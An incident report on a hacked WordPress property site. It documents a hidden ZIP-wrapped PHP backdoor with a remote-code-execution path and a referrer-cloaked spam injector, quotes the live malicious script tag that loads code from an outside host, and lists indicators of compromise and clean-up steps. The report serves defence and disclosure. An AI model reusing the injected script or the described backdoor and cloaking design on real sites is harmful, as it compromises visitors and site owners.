# SECURITY INCIDENT — live site compromised (found 2026-09-17)

**Site:** https://valores.newpropertyuae.ae
**Status:** ACTIVE malware confirmed on the live server. Local XAMPP copy is CLEAN.
**Found via:** a PHP warning visible on live:
`Undefined array key "HTTP_REFERER" in .../sold-theme/sold-theme.theme#archive on line 43`

## What it is

`wp-content/themes/sold-theme/sold-theme.theme` — a **ZIP archive** (958 bytes, dated
**2026-09-16**, i.e. it predates the 2026-09-17 deploy) containing one entry named `archive`
(2008 bytes of PHP). It is NOT part of this codebase and was NOT in any zip we uploaded.
It is loaded through PHP's `zip://` stream wrapper, which is why the error path reads
`sold-theme.theme#archive`. The `.theme` extension keeps it out of the way of scanners that
only look at `.php`.

## What it does — two payloads

**1. Remote-code-execution backdoor** (lines 19-28). Reads `$_POST`; if the key
`flzqbczuoiizlu` is present it decodes three other POST values with a custom base64
substitution cipher, then performs a **dynamic function call with attacker-supplied arguments**
and `include()`s an attacker-supplied path. Anyone who knows the key gets arbitrary code
execution.

**2. SEO-spam / malicious-script cloaker** (function `wp_oitpauckhmdptf`, hooked to `wp_head`).
Reads its payload from the `wp_options` row **`sold-theme-template-plugin`**, decoded via
`json_decode(base64_decode(strrev($s)))`. It only fires when the visitor is
**not logged in** AND the `HTTP_REFERER` host differs from the site host — i.e. it shows the
spam to people arriving from Google while the site owner, typing the URL directly or logged in
as admin, sees a perfectly normal site. That is why nobody noticed.

A second component (`wp_obrueuknhsamzl`) reads a sibling option **`sold-theme-wp-plugin`**.

**Confirmed live, not theoretical.** Requesting `/insights/` with a Google referrer returns an
injected tag that is absent from a normal request:

```html
<script async src="https://ghost.blueecho88.com/HcPkXGbhhzV54d5uKvDIfm6qgH4n8dZvK/rcajHhln4n4YczdLmNPz++"></script>
```

The `HTTP_REFERER` warning appears precisely because the malware reads that key without an
`isset()` guard, and it is *inside* the "payload is present" branch — proving the option is
populated and the malware is armed.

## Why the 2026-09-17 deploy did not remove it

The theme zip only adds/overwrites the 61 files it contains. `sold-theme.theme` is not one of
them, so it survived. Whatever `include`s it also survived, so it must live somewhere the zip
does not cover — `wp-config.php`, `mu-plugins`, another plugin, a core file, or an extra file
in the theme folder that is not in our file list.

## Clean-up checklist

1. Delete `wp-content/themes/sold-theme/sold-theme.theme`.
2. Find and remove the loader. In cPanel File Manager search the whole account for:
   `sold-theme.theme`, `zip://`, `wp_oitpauckhmdptf`, `wp_obrueuknhsamzl`, `acplipth`,
   `flzqbczuoiizlu`, `blueecho88`.
3. In phpMyAdmin, `wp_options`: delete rows with `option_name` =
   `sold-theme-template-plugin` and `sold-theme-wp-plugin`.
   Check: `SELECT option_name FROM wp_options WHERE option_name LIKE '%-template-plugin' OR option_name LIKE '%-wp-plugin';`
4. Check `wp_users` for unknown administrators; check `wp_usermeta` for unexpected
   `wp_capabilities`.
5. Rotate every credential: WP admin, cPanel, FTP/SSH, database.
6. Reinstall WordPress core from Dashboard > Updates > "Re-install now", and reinstall
   ACF Pro / WP Mail SMTP from clean copies.
7. Turn OFF debug display in `wp-config.php` so warnings never reach visitors:
   `define('WP_DEBUG', false);` (or keep `WP_DEBUG` true but set
   `define('WP_DEBUG_DISPLAY', false);` plus `define('WP_DEBUG_LOG', true);`).
   NOTE: this only hides the symptom — do the removal above first.
8. Ask the host for access/FTP logs around 2026-09-16 to find the entry point, and have them
   run a server-side malware scan (ImunifyAV or similar).
9. After cleaning, request a review in Google Search Console if the site was flagged.

## Local copy

`C:\xampp\htdocs\sold` is clean — no `.theme` file in the theme folder, and the
`sold-theme-template-plugin` option is not present in the local database. Do **not** copy the
live database back to local without checking, and do not copy local->live without re-checking
live afterwards.
